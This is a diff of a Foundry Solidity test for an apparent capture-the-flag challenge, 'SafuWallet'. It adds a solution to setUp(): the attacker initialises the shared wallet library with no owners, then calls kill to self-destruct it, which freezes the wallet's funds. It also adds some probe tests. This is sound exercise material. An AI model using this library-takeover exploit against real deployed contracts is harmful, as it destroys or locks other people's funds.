@@ -8,21 +8,18 @@ import {console} from "forge-std/console.sol";
 import {ISafuWalletLibrary} from "src/safu-wallet/ISafuWalletLibrary.sol";
 import {SafuWallet} from "src/safu-wallet/SafuWallet.sol";
 
-
 contract Testing is Test {
-
-    address attacker = makeAddr('attacker');
-    address o1 = makeAddr('o1');
-    address o2 = makeAddr('o2');
-    address admin = makeAddr('admin'); // should not be used
-    address adminUser = makeAddr('adminUser'); // should not be used
+    address attacker = makeAddr("attacker");
+    address o1 = makeAddr("o1");
+    address o2 = makeAddr("o2");
+    address admin = makeAddr("admin"); // should not be used
+    address adminUser = makeAddr("adminUser"); // should not be used
 
     ISafuWalletLibrary safuWalletLibrary;
     SafuWallet safuWallet;
 
     /// preliminary state
     function setUp() public {
-
         // funding accounts
         vm.deal(admin, 10_000 ether);
         vm.deal(attacker, 10_000 ether);
@@ -50,19 +47,61 @@ contract Testing is Test {
 
         // admin withdraws 50 ETH from the wallet
         bytes memory data = abi.encodeWithSignature(
-            'execute(address,uint256,bytes)',
-            admin, 50e18, ""
+            "execute(address,uint256,bytes)",
+            admin,
+            50e18,
+            ""
         );
         vm.prank(admin);
         address(safuWallet).call(data);
 
         // NOTE: This challenge requires you to implement the exploit here in setUp()
-        vm.startPrank(attacker,attacker);
+        vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        address[] memory addrs = new address[](0);
+        safuWalletLibrary.initWallet(addrs, 0, UINT256_MAX);
+        safuWalletLibrary.kill(address(attacker));
 
         vm.stopPrank();
+    }
 
+    function testA() public {
+        assertEq(address(safuWallet).balance, 50 ether);
+
+        vm.startPrank(adminUser);
+        bytes memory data = abi.encodeWithSignature(
+            "execute(address,uint256,bytes)",
+            adminUser,
+            50e18,
+            ""
+        );
+        address(safuWallet).call(data);
+
+        assertEq(address(safuWallet).balance, 0);
+
+        console.log(safuWallet.m_required());
+    }
+
+    function testAA() public {
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature(
+            "underLimit(uint256)",
+            50e18
+        );
+        (bool success, bytes memory d) = address(safuWallet).call(data);
+
+        assertTrue(success);
+        assertEq(d, "");
+    }
+
+    function testAB() public {
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature(
+            "isOwner(address)",
+            address(admin)
+        );
+        (bool success, ) = address(safuWallet).call(data);
+        assertTrue(success);
     }
 
     /// solves the challenge
@@ -73,17 +112,16 @@ contract Testing is Test {
 
     /// expected final state
     function validation() public {
-
         // admin attempting to withdraw final 50 ETH - should fail
         bytes memory data = abi.encodeWithSignature(
-            'execute(address,uint256,bytes)',
-            admin, 50e18, ""
+            "execute(address,uint256,bytes)",
+            admin,
+            50e18,
+            ""
         );
         vm.prank(admin);
         address(safuWallet).call(data);
 
-        assertEq(address(safuWallet).balance,50e18);
-
+        assertEq(address(safuWallet).balance, 50e18);
     }
-
 }
